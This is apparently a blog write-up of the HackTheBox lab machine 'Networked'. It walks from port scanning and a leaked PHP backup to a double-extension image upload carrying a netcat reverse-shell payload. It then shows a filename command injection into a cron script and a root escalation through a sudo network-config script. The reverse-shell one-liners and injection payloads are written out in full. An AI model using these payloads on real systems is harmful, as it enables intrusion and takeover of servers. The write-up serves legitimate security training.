---
title: "Networked - HackTheBox"
date: "2019-11-16"
---

## Information gathering

Let's start, as usual, with a port scan:
```
$ nmap -A -T4 10.10.10.146
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-22 00:48 EDT
Nmap scan report for 10.10.10.146
Host is up (0.051s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
```

There's a web server, this is the homepage content:
```html
<html>
<body>
Hello mate, we're building the new FaceMash!</br>
Help by funding us and be the new Tyler&Cameron!</br>
Join us at the pool party this Sat to get a glimpse
<!-- upload and gallery not yet linked -->
</body>
</html>
```

As the comment says, the upload and the gallery are not linked yet. Let's
search if they are already on the server:
```
$ gobuster dir -q -t 40 -w raft-large-directories.txt -u http://10.10.10.146
/backup (Status: 301)
/uploads (Status: 301)
```
```
$ gobuster dir -q -t 40 -w raft-large-files.txt -u http://10.10.10.146
/index.php (Status: 200)
/upload.php (Status: 200)
/photos.php (Status: 200)
/lib.php (Status: 200)
```

The `/backup` directory contains a tar archive, so after downloading it let's
extract it:
```
$ tar -xvf backup.tar
index.php
lib.php
photos.php
upload.php
```
They seem to be the same files that are hosted on the web server! Let's check
`upload.php`:
```php
<?php
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>
```

What it does is it checks if the uploaded file is an image, renames it to our IP
address with underscores instead of dots and puts it in the uploads directory.
This is the `lib.php` file:

```php
<?php

function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}

function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}

function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }
}

function displayform() {
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
 <input type="file" name="myFile">
 <br>
<input type="submit" name="submit" value="go!">
</form>
<?php
  exit();
}
?>
```

The biggest problem is that the `file_mime_type` function, determines the type
of file based on the magic bytes.

So if we embed some PHP code in an image, and name it `image.php.png` the server
will name it , in my case, `10.10.14.8.php.png`, it will replace the dots in the
file name with underscores and the final name will be `10_10_14_8.php.png` and
this allows PHP to run the code inside it.

This is an example of the gallery after a file gets uploaded:
![](/images/hackthebox/networked/uploaded.png)

## Getting a shell


Let's embed a PHP command to execute a reverse shell, I will use exiftool for
convenience:
```
$ exiftool -Comment='<?php system("nc 10.10.14.4 1337 -e /bin/bash"); ?>' hackthebox.png
    1 image files updated
```
Let's rename the file and upload it. After refreshing the gallery page, the PHP
code gets executed and we have shell:
```
$ nc -lnvp 1337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:57998.
whoami
apache
```

## Escalate to user

After some common enumeration techniques and procedure, I found two appealing
files in the home directory of the user, which we can read, luckily:
```
bash-4.2$ ls /home/guly
check_attack.php  crontab.guly  user.txt
```

The cron file calls every three minutes a PHP script:
```
*/3 * * * * php /home/guly/check_attack.php
```
Hopefully it will be installed in the cron daemon.


The `check_attack.php` file checks content of the uploads directory and if there
is a file that does not respect the custom IP address syntax that the
`upload.php` file creates, it deletes it:
{{< highlight php "linenos=table" >}}
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
  $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}
?>
{{< /highlight >}}

The vulnerability lies in line 29, because the `$value` variable represents the
file name in the uploads directory and it is included in the `exec` function without any checks.
For example, if there was a file called `; ls`, the `exec` function would execute this:
```
nohup /bin/rm -f $path; ls > /dev/null 2>&1 &
```

As user `apache` we can create files in the upload directory, so we can try to
execute a netcat reverse shell.
Let's create a file called `; nc 10.10.14.1 1338 - bash`, but we need to escape
spaces:
```
$ touch \;nc\ 10\.10\.14\.4\ 1338\ -c\ bash
```

Let's setup our listener and in maximum of three minutes, we should get a shell:
```
$ nc -nlvp 1338
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1338
Ncat: Listening on 0.0.0.0:1338
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:58834.
```
And here it is! Let's use python to have a prompt and check the flag:
```
python -c "import pty; pty.spawn('/bin/bash')"
[guly@networked ~]$ wc -c user.txt
33 user.txt
```
I suggest to create a pair of ssh keys and add it to the authorized keys of the
user, to have a stable shell.


# Privilege escalation

Running the usual [LinEnum](https://github.com/rebootuser/LinEnum) we find out
that we can run a command as root without providing the password:
```
[+] We can sudo without supplying a password!
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

Let's check what the `changename.sh` script does:
{{< highlight bash "linenos=table" >}}
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
{{< /highlight >}}

What it does is it asks the user for some parameters to configure a network
interface, and the given input must match the regular expression. The problem is
that in line 18, if we gave `foo bash` as input, the `$var` variable becomes
`foo`, and `bash` will be executed. And luckily for us, we can use spaces as
input.
Let's try to get a root shell then:
```
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
foo bash
interface PROXY_METHOD:
bar
interface BROWSER_ONLY:
foo
interface BOOTPROTO:
bar
[root@networked network-scripts]# wc -c /root/root.txt
33 root.txt
```

Lessons learned: read carefully the documentation before writing system scripts!
